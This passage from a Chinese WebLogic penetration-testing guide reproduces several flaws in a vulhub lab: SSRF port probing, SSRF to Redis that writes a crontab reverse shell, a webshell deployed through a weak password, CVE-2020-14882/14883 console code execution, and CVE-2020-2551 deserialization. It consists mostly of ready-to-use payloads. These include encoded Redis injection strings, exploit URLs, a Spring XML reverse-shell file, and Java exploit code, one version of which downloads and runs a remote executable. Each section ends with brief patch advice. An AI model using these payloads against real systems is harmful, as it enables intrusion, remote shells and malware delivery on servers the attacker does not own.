10.0.2.0
10.3.6.0
```

##### 验证漏洞

访问该路径，如果能正常访问，说明存在该漏洞

```
/uddiexplorer/SearchPublicRegistries.jsp
```

![](../../.resource/remote/690575eb9377fb02aeaac88c2ab28fbde8e19e9a6035db716f131ee5d7619c34.png)image-20210814185115833

##### 漏洞复现

这里复现用的 vulhub 靶场环境

![](../../.resource/remote/fafd75af3ef2d4ef80901cc5828a3eb279515f1dc22fa490360481f6edc6b1d0.png)

抓包，在 url 后跟端口, 把 url 修改为自己搭建的服务器地址, 访问开放的 7001 端口

![](../../.resource/remote/9243c49cb43dd7b174d360ce560a95875a2cd9a80f5bd56be4150cba2f5ffb2a.png)image-20210814192248494![](../../.resource/remote/844e3601b782372d88a6dddaa6c62b597bf067cf22e7f53d4018cba11117859d.png)image-20210814192515111

发现返回如下信息，说明开放 7001 端口，但是不是 http 协议

```
An error has occurred<BR>weblogic.uddi.client.structures.exception.XML_SoapException: The server at http://127.0.0.1:7001 returned a 404 error code (Not Found).  Please ensure that your URL is correct, and the web service has deployed without error.
```

image-20210814192706701

访问未开放的端口，会返回下面的信息

```
An error has occurred<BR>weblogic.uddi.client.structures.exception.XML_SoapException: Tried all: '1' addresses, but could not connect over HTTP to server: '127.0.0.1', port: '7002'
```

![](../../.resource/remote/09717c32f05878f39bd8f2ba39d2164a01a07157f5b79ed5fd1ee39b9c0d2601.png)image-20210814193417626

访问存在的端口，且为 http 协议时返回如下

```
An error has occurred<BR>weblogic.uddi.client.structures.exception.XML_SoapException: Received a response from url: http://192.168.0.108:80 which did not have a valid SOAP content-type: text/html.
```

![](../../.resource/remote/b904b3dc216cbd8294d6784b902725c8393b13c7e6bb5b0a778bf718ad3a5c86.png)image-20210814203203147

#### 7.weblogic SSRF 联动 Redis

##### 漏洞复现

依旧用的上面这个靶场

![](../../.resource/remote/1c3fcd0dfc0e1c1e5956491f67363c190dd343971bb22fb2b3a1b34bf38b19c2.png)image-20210814204005054

这里查一下开启 redis 服务的这个容器 IP，找到 ip：172.20.0.2

```shell
docker inspect a5a
```

![](../../.resource/remote/2a8176f06b5c1553c662ce7a7b508d33545225d790fa87fa8340dddf640b9d53.png)image-20210814204200558

可以看见 6379 的端口存在，且为 http 协议

![](../../.resource/remote/2238fece9eac8478cf88f4ff736926cbd88aeb7692927a70abd0cb998603e66e.png)image-20210814204413085

本机监听 12345 端口

![](../../.resource/remote/73fa218163f16fd8270e012b4003d235aa944bd69b7798707c8ca39bccfd2060.png)image-20210814204756777

burp 改包直接将弹 shell 脚本到本机 kail 上（192.168.0.104）

```
set 1 "\n\n\n\n* * * * * root bash -i >& /dev/tcp/192.168.0.104/12345 0>&1\n\n\n\n"config set dir /etc/config set dbfilename crontabsave
```

经过 url 编码后，写入 bp 中 operator 参数的后面:

```
operator=http://172.20.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.104%2F12345%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
```

![](../../.resource/remote/38f7d9bce544f793434986c65e54e712329a2bdd27b54eca6b40a85921dc7355.png)image-20210814210942824![](../../.resource/remote/d3c90b8fb8b4d221678082295558f07b62068c509b6a4791ca21bbe95cdcd385.png)image-20210814211117689

反弹 shell 成功。

##### 安全防护

升级高版本。

#### 8.Weblogic 弱口令 && 后台 getshell

##### 漏洞简介

由于管理员的安全意识不强，或者配置时存在疏忽，会导致后台存在弱口令或者默认的用户名 / 口令。

#### 影响版本

全版本

#### 漏洞复现

通过弱口令登录管理台后，点击部署 -> 安装

![](../../.resource/remote/615c922abd83da89a6b81ccbbb612afae0ce8d1f7efd700da0941d16980a786d.png)image-20210814212040819![](../../.resource/remote/3369debe7b1b3d4c64c9d1b3758f621a7fbcfce265b714c13b3b1d2a498e77f6.png)image-20210814212434754![](../../.resource/remote/1b4a5f128fdadaa784fedce98710ee3cc4f7b0e390e6298f1a3536ec6029351b.png)image-20210814212521338

这里 war 包成功上传

![](../../.resource/remote/9d1651869abbd334ca53bf19fc3cbec6aa18c5caef05369163aebcbc59a594c2.png)image-20210814212645817

将其作为应用程序安装

image-20210814212857889![](../../.resource/remote/8824b4f17840df949c5eace76e90e5ce2bb3b24cdd6df7a4f89ca5a6bdfef7d6.png)image-20210814212917962

点击完成。

![](../../.resource/remote/c97022662d2565bffa8ba811c752d95a52ff479fdc1bb1f65342bfca21ce0fbe.png)image-20210814213012827

可以看见部署成功，访问 url

```
http://192.168.0.105:7001/zcc/JspSpy.jsp
```

image-20210814214222692

输入密码，即可成功拿到 webshell

![](../../.resource/remote/90f72a9c8ed133ddffddb26077dfebc0e15547bdeacee2cee3d5979780ad3b87.png)image-20210814214304327

#### 安全防护

避免出现弱口令

#### 9.Weblogic Console HTTP 协议远程代码执行漏洞 (CVE-2020-14882/CVE-2020-14883)

##### 漏洞简介

未经身份验证的远程攻击者可能通过构造特殊的 HTTP GET 请求，利用该漏洞在受影响的 WebLogic Server 上执行任意代码。它们均存在于 WebLogic 的 Console 控制台组件中。此组件为 WebLogic 全版本默认自带组件，且该漏洞通过 HTTP 协议进行利用。将 CVE-2020-14882 和 CVE-2020-14883 进行组合利用后，远程且未经授权的攻击者可以直接在服务端执行任意代码，获取系统权限。

##### 影响版本

```
10.3.6.0
12.1.3.0
12.2.1.3
12.2.1.4
14.1.1.0
```

##### 漏洞复现

CVE-2020-14883: 权限绕过漏洞的 poc：

```
http://192.168.0.105:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=AppDeploymentsControlPage&handle=com.bea.console.handles.JMXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29
```

访问该 url 之后，进入如下页面，可以看见成功进入管理台：

![](../../.resource/remote/d3737cba09b6d3f9fcad394078bab792b9ad7101c2304a5288cc674f174f2071.png)image-20210814220636352

CVE-2020-14882: 代码执行漏洞的 poc：

```
http://192.168.0.106:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch /tmp/zcc123%27);%22);
```

这里复现用的 vulhub 靶场

![](../../.resource/remote/df6a3dba73a442fba1b2a4f1a8197056be4ed061fb32493b91a8a65a22db3a18.png)image-20210814222333621

访问报 404，不要慌，此时去容器中看会发现文件已成功写入；

![](../../.resource/remote/be55b8df62eb028595cb2ae248c28b0dfff806946ff0a23958b8a64ca057d3c7.png)image-20210814221311713![](../../.resource/remote/52d0749b3379b1f76398cc2c7669e855cd9710ce434a616c92f66a99f94810d4.png)

这里执行反弹 shell 的 xml 文件 poc.xml：

```
## poc.xml<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">    <constructor-arg>      <list>        <value>/bin/bash</value>        <value>-c</value>        <value><![CDATA[bash -i >& /dev/tcp/192.168.0.104/6669 0>&1]]></value>      </list>    </constructor-arg>  </bean></beans>
```

把 poc.xml 放在打开 http 服务的 kali 机子上 (ip:192.168.0.108)：

![](../../.resource/remote/b6ce4bad19ea025ab9678a388ade0be0ede2ce060333031fec869ca5518a1469.png)

在监听机子上开启监听：

![](../../.resource/remote/2d592e2d662acd931db16b6150b2d52cba2bd8756121ca6e70836b3ee8060701.png)image-20210814223442393

然后访问该 url：

```
http://192.168.0.106:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://192.168.0.108/poc.xml")
```

![](../../.resource/remote/7df4e442496d7fe2dcf39c459abd7614fafaae7fcc5443f7f199891783606758.png)image-20210814224224450

同理，上线 cs 的话把反弹的命令改了即可。

##### 安全防护

升级官方补丁：https://www.oracle.com/security-alerts/cpuoct2020.html

#### 10.IIOP 反序列化漏洞（CVE-2020-2551）

##### 漏洞简介

2020 年 1 月 15 日，Oracle 官方发布 2020 年 1 月关键补丁更新公告 CPU（CriticalPatch Update），其中 CVE-2020-2551 的漏洞，漏洞等级为高危，CVVS 评分为 9.8 分，漏洞利用难度低。IIOP 反序列化漏洞影响的协议为 IIOP 协议，该漏洞是由于调用远程对象的实现存在缺陷，导致序列化对象可以任意构造，在使用之前未经安全检查，攻击者可以通过 IIOP 协议远程访问 Weblogic Server 服务器上的远程接口，传入恶意数据，从而获取服务器权限并在未授权情况下远程执行任意代码.

##### 影响版本

```
10.3.6.0
12.1.3.0
12.2.1.3
12.2.1.4
```

##### 漏洞复现

需要安装 java8 环境

```
cd /optcurl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gztar zxvf jdk-8u20-linux-x64.tar.gzrm -rf /usr/bin/java*ln -s /opt/jdk1.8.0_20/bin/j* /usr/binjavac -versionjava -version
```

这里我已经安装好

![](../../.resource/remote/b7cf85586ac49ce26115cfed28db142335358d4a18c5343d423627af107013da.png)image-20210814225849356

exp.java 代码

```python
import java.io.IOException;public class exp { static{  try {   java.lang.Runtime.getRuntime().exec(new String[]{"cmd","/c","calc"});  } catch (IOException e) {   e.printStackTrace();  } } public static void main(String[] args) {   \}\}
```

image-20210814230308993

java 编译 exp.java

```
javac exp.java -source 1.6 -target 1.6
```

![](../../.resource/remote/adaa2a0d93fff67d5b483a9b8f3d47623db173b7591b2d7848f6078cc9407bf9.png)image-20210814230430269

接着 python 开启 http 服务, 与 exp.class 在同一文件夹即可

![](../../.resource/remote/849c797530b86c7d0bb3b3384a62780e2884819654f14649f73bc0625895a17f.png)image-20210814230710705

使用 marshalsec 启动一个 rmi 服务

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.0.108/#exp" 12345
```

![](../../.resource/remote/957023e4e30a0acca4deeb436734f40a2668cb5b8e74aa470d2a818d963a851e.png)image-20210814230935474

使用工具 weblogic_CVE_2020_2551.jar，执行 exp

```
java -jar weblogic_CVE_2020_2551.jar 192.168.0.105 7001 rmi://192.168.0.108:12345/exp
```

![](../../.resource/remote/ee93020f165b2070830b48b87b7d35b124f3a7e34d60cea1b95e1c771432b45e.png)image-20210814231847184

可以看见成功弹出

![](../../.resource/remote/8dfcb7a92ee01054396b07c9170c8bbfa4cd4a404b30683d8b67eb7f4c4d60bb.png)image-20210814231822800

同理，上线 cs 的话，只需改 exp.java 代码即可，后续步骤一样

```python
import java.io.IOException;public class exp { static{  try {   java.lang.Runtime.getRuntime().exec(new String[]{"powershell","/c"," (new-object System.Net.WebClient).DownloadFile('http://x.x.x.x/zcc.exe','zcc.exe');start-process zcc.exe"});  } catch (IOException e) {   e.printStackTrace();  } } public static void main(String[] args) {   \}\}
```

##### 安全防护

使用官方补丁进行修复：https://www.oracle.com/security-alerts/cpujan2020.html

欢迎关注亿人安全！

公众号

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
